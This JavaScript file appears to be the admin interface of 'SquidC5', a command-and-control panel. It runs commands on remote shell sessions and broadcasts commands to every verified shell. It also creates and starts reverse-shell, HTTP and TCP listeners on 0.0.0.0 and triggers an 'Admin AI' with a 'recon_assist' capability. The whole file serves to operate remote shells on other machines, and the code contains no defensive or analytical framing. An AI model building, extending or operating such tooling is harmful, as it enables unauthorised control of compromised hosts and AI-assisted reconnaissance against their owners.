/* SquidC5 admin UI — only loaded after server confirms admin token */
(function () {
  const api = window.__SC5_API__;
  const $ = window.__SC5_$;
  const showError = window.__SC5_showError;
  const showOk = window.__SC5_showOk;
  const showOutput = window.__SC5_showOutput;
  const can = window.__SC5_can;
  const refresh = window.__SC5_refresh;
  const state = window.__SC5_STATE__;

  const root = document.getElementById("adminMount");
  if (!root) return;

  root.innerHTML = `
    <div class="card" id="quickRunCard">
      <h2>Run command</h2>
      <label for="shellSelect">Target shell</label>
      <select id="shellSelect"><option value="">(none)</option></select>
      <label for="shellCmd">Command</label>
      <textarea id="shellCmd" placeholder="whoami"></textarea>
      <div class="row">
        <button type="button" class="primary" id="runShellBtn">Run</button>
        <button type="button" id="runAllBtn">All verified</button>
      </div>
      <h2 style="margin-top:12px">Output</h2>
      <div class="outbox empty-out" id="shellOut">Run a command to see output here.</div>
    </div>

    <details class="panel" id="featuresPanel" open>
      <summary>🎛 Feature toggles</summary>
      <p class="muted">Server-enforced. Off = API denies the feature even if client tries.</p>
      <div id="featureToggles"></div>
      <div class="row">
        <button type="button" class="primary" id="saveFeaturesBtn">Save features</button>
        <button type="button" id="reloadFeaturesBtn">Reload</button>
      </div>
    </details>

    <details class="panel" id="adminPanel">
      <summary>🛠 More admin tools</summary>
      <div class="row">
        <button type="button" id="reapBtn">Reap dead shells</button>
        <button type="button" class="danger" id="closeShellBtn">Close selected shell</button>
      </div>
      <label for="listenerSelect">Listener</label>
      <select id="listenerSelect"><option value="">(none)</option></select>
      <div class="row">
        <button type="button" id="startLisBtn">Start</button>
        <button type="button" id="stopLisBtn">Stop</button>
      </div>
      <label>Create listener</label>
      <div class="row">
        <input id="newLisName" placeholder="name" style="flex:1.2" />
        <input id="newLisPort" type="number" placeholder="port" style="flex:0.8" />
      </div>
      <div class="row">
        <select id="newLisKind">
          <option value="reverse_shell">reverse_shell</option>
          <option value="http">http</option>
          <option value="tcp">tcp</option>
        </select>
        <button type="button" class="primary" id="createLisBtn">Create + start</button>
      </div>
      <div class="row" style="margin-top:12px">
        <button type="button" id="auditBtn">Load audit</button>
        <button type="button" id="metricsBtn">Raw metrics</button>
      </div>
      <div class="outbox" id="adminOut"></div>
    </details>

    <div class="card" id="aiCard">
      <h2>Admin AI</h2>
      <div class="stats" style="margin-bottom:8px">
        <div class="stat"><div class="n" id="aiStatusN" style="font-size:0.95rem">—</div><div class="l">Status</div></div>
        <div class="stat"><div class="n" id="aiModeN" style="font-size:0.95rem">—</div><div class="l">Mode</div></div>
        <div class="stat"><div class="n" id="aiCallsN">—</div><div class="l">Calls</div></div>
      </div>
      <p class="muted mono" id="aiModelLine">—</p>
      <p class="muted" id="aiLastLine" style="margin-top:6px">last: —</p>
      <div class="row" style="margin-top:8px">
        <button type="button" id="aiRefreshBtn">Refresh AI</button>
        <button type="button" id="aiDebugBtn">Debug</button>
        <button type="button" id="aiTestBtn">Test recon</button>
      </div>
      <div class="outbox empty-out" id="aiOut" style="margin-top:10px;border-color:rgba(192,38,255,0.35);color:#e9d5ff">AI debug / last result</div>
    </div>
  `;

  function renderFeatures(features, catalog) {
    const box = $("featureToggles");
    if (!box) return;
    const cat = catalog || [];
    const labels = {};
    cat.forEach((c) => { labels[c.key] = c.label; });
    let html = "";
    Object.keys(features || {}).sort().forEach((key) => {
      const on = !!features[key];
      const label = labels[key] || key;
      html += `<label class="feat-row" style="display:flex;align-items:center;justify-content:space-between;gap:10px;margin:8px 0;text-transform:none;letter-spacing:0;font-size:0.85rem;font-weight:600;color:#e4e4e7">
        <span>${label}<div class="muted mono" style="font-weight:400;font-size:0.7rem">${key}</div></span>
        <input type="checkbox" data-feat="${key}" ${on ? "checked" : ""} style="width:auto;transform:scale(1.2)" />
      </label>`;
    });
    box.innerHTML = html || '<div class="empty">No features</div>';
  }

  async function loadFeatures() {
    const data = await api("GET", "/api/v1/features");
    state.features = data.features || {};
    renderFeatures(data.features, data.catalog);
  }

  window.__SC5_renderAdminShells = function (shells) {
    const sel = $("shellSelect");
    if (!sel) return;
    const prev = sel.value;
    sel.innerHTML = '<option value="">(select shell)</option>';
    (shells || []).forEach((s) => {
      const opt = document.createElement("option");
      opt.value = s.id;
      opt.textContent = `${(s.id || "").slice(0, 12)}…  ${s.remote_addr || ""}`;
      sel.appendChild(opt);
    });
    if (prev && (shells || []).some((s) => s.id === prev)) sel.value = prev;
  };

  window.__SC5_renderAdminListeners = function (listeners) {
    const sel = $("listenerSelect");
    if (!sel) return;
    const prev = sel.value;
    sel.innerHTML = '<option value="">(select listener)</option>';
    (listeners || []).forEach((l) => {
      const opt = document.createElement("option");
      opt.value = l.id;
      opt.textContent = `${l.name || l.id} :${l.port} (${l.kind})`;
      sel.appendChild(opt);
    });
    if (prev) sel.value = prev;
  };

  window.__SC5_renderAi = function (st) {
    if (!$("aiStatusN")) return;
    const last = st.last || {};
    const llm = (st.llms || [])[0];
    $("aiStatusN").textContent = st.busy ? "busy" : (st.status || "—");
    $("aiModeN").textContent = st.active_mode || last.mode || "—";
    const calls = (st.metrics && (st.metrics["ai.admin.calls"] || st.metrics["ai.admin.llm_ok"])) || 0;
    $("aiCallsN").textContent = String(calls);
    $("aiModelLine").textContent = llm
      ? `${llm.provider}/${llm.model} · key=${llm.has_api_key ? "yes" : "no"}`
      : "no LLM · offline fallback";
    if (last.capability) {
      const when = last.ts ? new Date(last.ts * 1000).toLocaleTimeString() : "—";
      $("aiLastLine").textContent =
        `last: ${last.capability} · ${last.mode || "?"} · ${last.ok === false ? "ERR" : "ok"} · ${last.latency_ms || "?"}ms · ${when}`;
    } else {
      $("aiLastLine").textContent = "last: none yet";
    }
  };

  $("runShellBtn").onclick = async () => {
    const sid = $("shellSelect").value;
    const cmd = $("shellCmd").value.trim();
    if (!sid || !cmd) return showError("Select a shell and enter a command");
    $("runShellBtn").disabled = true;
    showOutput("… running …");
    try {
      const res = await api("POST", "/api/v1/shell/command", {
        session_id: sid, command: cmd, wait_sec: 5, idle_sec: 0.5,
      });
      const out = (res && res.output != null) ? res.output : "";
      if (res.dropped || res.error === "echo_only_zombie") {
        showOutput("", "DROPPED echo-only zombie");
        showError("Echo-only zombie — session dropped");
      } else {
        showOutput(out || "(no output)", `$ ${cmd}  ·  ${sid.slice(0, 12)}…`);
        showOk(out.trim() ? "OK" : "Sent (no output / timeout)");
      }
      refresh().catch(() => {});
    } catch (e) {
      showOutput(String(e.message || e), "ERROR");
      showError(String(e.message || e));
    } finally {
      $("runShellBtn").disabled = false;
    }
  };

  $("runAllBtn").onclick = async () => {
    const cmd = $("shellCmd").value.trim();
    if (!cmd) return showError("Enter a command");
    $("runAllBtn").disabled = true;
    showOutput("… broadcasting …");
    try {
      const res = await api("POST", "/api/v1/shell/broadcast", {
        command: cmd, wait_sec: 5, idle_sec: 0.5,
      });
      const lines = (res.results || []).map((r) => {
        if (r.dropped) return `── ${r.session_id} DROPPED ──`;
        return `── ${r.session_id} ${r.remote_addr || ""} ──\n${(r.output || "").trim() || "(no output)"}`;
      });
      showOutput(lines.join("\n\n") || "(no targets)", `broadcast → ${res.targets || 0}\n$ ${cmd}`);
      showOk(`Broadcast to ${res.targets || 0} shell(s)`);
      refresh().catch(() => {});
    } catch (e) {
      showOutput(String(e.message || e), "ERROR");
      showError(String(e.message || e));
    } finally {
      $("runAllBtn").disabled = false;
    }
  };

  $("reapBtn").onclick = async () => {
    try {
      const res = await api("POST", "/api/v1/sessions/reap", { probe: true });
      showOk(`Reaped ${res.closed} shell(s)`);
      refresh();
    } catch (e) { showError(String(e.message || e)); }
  };
  $("closeShellBtn").onclick = async () => {
    const sid = $("shellSelect").value;
    if (!sid) return showError("Select a shell");
    try {
      await api("POST", `/api/v1/sessions/${sid}/close`);
      showOk("Session closed");
      refresh();
    } catch (e) { showError(String(e.message || e)); }
  };
  $("startLisBtn").onclick = async () => {
    const id = $("listenerSelect").value;
    if (!id) return showError("Select a listener");
    try {
      await api("POST", `/api/v1/listeners/${id}/start`);
      showOk("Listener started");
      refresh();
    } catch (e) { showError(String(e.message || e)); }
  };
  $("stopLisBtn").onclick = async () => {
    const id = $("listenerSelect").value;
    if (!id) return showError("Select a listener");
    try {
      await api("POST", `/api/v1/listeners/${id}/stop`);
      showOk("Listener stopped");
      refresh();
    } catch (e) { showError(String(e.message || e)); }
  };
  $("createLisBtn").onclick = async () => {
    const name = $("newLisName").value.trim();
    const port = Number($("newLisPort").value);
    const kind = $("newLisKind").value;
    if (!name || !port) return showError("Name and port required");
    try {
      const created = await api("POST", "/api/v1/listeners", { name, port, kind, host: "0.0.0.0" });
      await api("POST", `/api/v1/listeners/${created.id}/start`);
      showOk(`Created & started ${name} :${port}`);
      refresh();
    } catch (e) { showError(String(e.message || e)); }
  };
  $("auditBtn").onclick = async () => {
    try {
      const rows = await api("GET", "/api/v1/audit?limit=15");
      $("adminOut").textContent = (rows || []).map((a) => `${a.action}  ${a.actor}  allow=${a.allowed}`).join("\n") || "(empty)";
    } catch (e) { showError(String(e.message || e)); }
  };
  $("metricsBtn").onclick = async () => {
    try {
      const m = await api("GET", "/api/v1/metrics");
      $("adminOut").textContent = JSON.stringify(m.metrics || m, null, 2);
    } catch (e) { showError(String(e.message || e)); }
  };

  $("saveFeaturesBtn").onclick = async () => {
    const updates = {};
    document.querySelectorAll("[data-feat]").forEach((el) => {
      updates[el.getAttribute("data-feat")] = !!el.checked;
    });
    try {
      const res = await api("PUT", "/api/v1/features", { features: updates });
      state.features = res.features || updates;
      renderFeatures(state.features, res.catalog);
      showOk("Features saved (server-enforced)");
    } catch (e) { showError(String(e.message || e)); }
  };
  $("reloadFeaturesBtn").onclick = () => loadFeatures().catch((e) => showError(String(e.message || e)));

  $("aiRefreshBtn").onclick = async () => {
    try {
      const st = await api("GET", "/api/v1/ai/status");
      window.__SC5_renderAi(st);
      $("aiOut").classList.remove("empty-out");
      $("aiOut").textContent = JSON.stringify({
        status: st.status, active_mode: st.active_mode, busy: st.busy,
        llm_count: st.llm_count, llms: st.llms, last: st.last, metrics: st.metrics,
      }, null, 2);
      showOk("AI status refreshed");
    } catch (e) { showError(String(e.message || e)); }
  };
  $("aiDebugBtn").onclick = async () => {
    try {
      const st = await api("GET", "/api/v1/ai/status?debug=true");
      window.__SC5_renderAi(st);
      $("aiOut").classList.remove("empty-out");
      $("aiOut").textContent = JSON.stringify(st, null, 2);
      showOk("AI debug loaded");
    } catch (e) { showError(String(e.message || e)); }
  };
  $("aiTestBtn").onclick = async () => {
    $("aiTestBtn").disabled = true;
    $("aiOut").textContent = "… calling Admin AI …";
    $("aiOut").classList.remove("empty-out");
    try {
      const res = await api("POST", "/api/v1/ai/run", {
        capability: "recon_assist",
        user_data: "dashboard health check",
      });
      $("aiOut").textContent = JSON.stringify(res, null, 2);
      showOk(`AI ${res.mode || "ok"}`);
      const st = await api("GET", "/api/v1/ai/status");
      window.__SC5_renderAi(st);
    } catch (e) {
      $("aiOut").textContent = String(e.message || e);
      showError(String(e.message || e));
    } finally {
      $("aiTestBtn").disabled = false;
    }
  };

  loadFeatures().catch((e) => showError(String(e.message || e)));
  window.__SC5_ADMIN_LOADED__ = true;
})();
